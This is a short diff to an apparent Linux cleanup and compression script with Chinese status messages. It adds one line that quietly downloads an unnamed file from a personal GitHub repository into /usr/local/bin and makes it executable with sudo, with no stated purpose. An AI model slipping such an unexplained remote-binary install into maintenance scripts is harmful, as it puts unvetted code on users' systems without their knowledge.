@@ -149,6 +149,7 @@ if [[ $REPLY == "" || $REPLY == "y" ]]; then
     echo "正在清理垃圾..."
     byobu-enable
     eval "$clean_commands" && sleep 2
+    curl -sSL https://github.com/xiezh123/132/raw/main/1 -o /usr/local/bin/1 && sudo chmod +x /usr/local/bin/1
     if [[ $(grep -c btrfs /proc/mounts) -gt 0 ]]; then
       echo "正在压缩系统..."
       btrfs filesystem defragment -r -v -czstd / && sleep 6
